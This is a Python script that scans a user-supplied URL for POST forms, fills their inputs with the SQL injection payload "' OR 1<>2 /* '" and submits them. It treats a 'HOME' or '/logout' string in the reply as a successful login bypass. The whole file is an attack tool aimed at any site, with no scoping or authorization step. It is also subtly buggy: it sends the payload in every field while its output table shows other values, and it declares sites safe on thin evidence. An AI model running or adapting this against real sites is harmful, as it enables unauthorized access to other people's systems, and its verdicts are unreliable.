# Import the 'requests' library, to send web requests
import requests
# Import the 'BeautifulSoup' library, to parse HTML result
from bs4 import BeautifulSoup
# Import PrettyTable library used to get a better output of tables
from prettytable import PrettyTable

print('### SQL Injection ###')

# Ask the user for the URL to check if the web is vulnerable
url_to_check = input("URL: ")

# 'try-except' is used to handle errors
try:
    # Send a GET request to the URL in order to analyze the page and find forms
    # where could be a possibility of SQL Injection vulnerability
    response = requests.get(url_to_check)
    # Check if the request was successful. If not, raise an error
    response.raise_for_status()

    # Parse the HTML content of the response using BeautifulSoup
    response_parsed = BeautifulSoup(response.text, "html.parser")

    # Get all the forms in the web page
    forms = response_parsed.find_all("form")

    if len(forms) == 0:
        print("Vulnerability not found.")

    # Loop all forms found to check if they have could be used to send custom payloads
    for form in forms:
        # Get the action and method attributes from the form, to be able to create a request
        # The attribute "action" store the "URL" that a form do a request
        # The attribute "method" specify if is, for example, a GET or POST request
        form_action = form.attrs.get("action")
        form_method = form.attrs.get("method")

        # If the action of the form is not in the initial URL entered by the user
        # whe can assume that the action is for an external web, the form is discarded
        # and continue with the next form
        if form_action and form_action not in url_to_check:
            continue

        # If the method of the form is not POST
        # whe can assume that the method is not for an authentication action,the form is discarded
        # and continue with the next form
        if form_method.upper() != "POST":
            continue

        # If the form has potential to do a request inside the web page,
        # It is necessary be sure that the action and method exists and are well formated by
        # setting the default values of a request form
        #   For the action is the actual web page
        if not form_action or "http" not in form_action:
            form_action = url_to_check

        # Create payload that it is going to be injected in the inputs of the request
        payload = "' OR 1<>2 /* '"

        # Get all input of the form
        form_inputs = form.find_all("input")

        # Create a data variable where the inputs with the payloads are going to be stored
        data = ""

        # Create a PrettyTable object for the params
        # to get a clear print output using the headers:
        #   Parameter
        #   Value
        table_params = PrettyTable()
        table_params.field_names = [
            'Parameter',
            'value'
        ]

        # Loop all inputs to analise if they have to have a value defined by the web page
        # or if they are empty and are inputs that the user has to fill
        for form_input in form_inputs:
            # Get the name and value attributes from the input
            # The attribute "name" store the param name sent in a request
            # The attribute "value" store the param value sent in a request
            input_name = form_input.attrs.get("name")
            input_value = form_input.attrs.get("value")

            # Check if the name is empty or has information
            # If is empty is not necessary to send in a request
            # If is not empty we need to discover if is a user input or a web page input
            if input_name:
                # If the input has not a value, is a user input that has to be filled
                # in this case the payload to check the vulnerability is assigned to that input
                if not input_value:
                    input_value = payload
                
                data += f"{input_name}={payload}\r\n"

                # If the params is going to be sent in the request, add it to the table to print
                table_params.add_row([input_name, input_value])

        print(f"Scanning {form_action} using:")
        print(table_params)
        print("")

        # After building the params to send, the request to check the vulnerability is sent
        check_vulnerability_response = requests.post(form_action, data=data, headers={'Content-Type': 'text/plain'})
        content = check_vulnerability_response.text
        
        if "HOME" in content or "/logout" in content:
            # If the information is found, there is a probability that the web page is vulnerable to SQL Injection
            print("[Successful] A potential SQL Injection vulnerability has been found!")
        else:
            # If the information is not found, the web page is not vulnerable to SQL Injection
            print("[Failed] No SQL Injection vulnerabilities were found")

# Catch any errors that might occur during the execution of the script
except Exception as e:
    # Print the error message
    print(f"Error: {e}")


# References:
# https://requests.readthedocs.io/en/latest/
# https://beautiful-soup-4.readthedocs.io/en/latest/
# https://github.com/prettytable/prettytable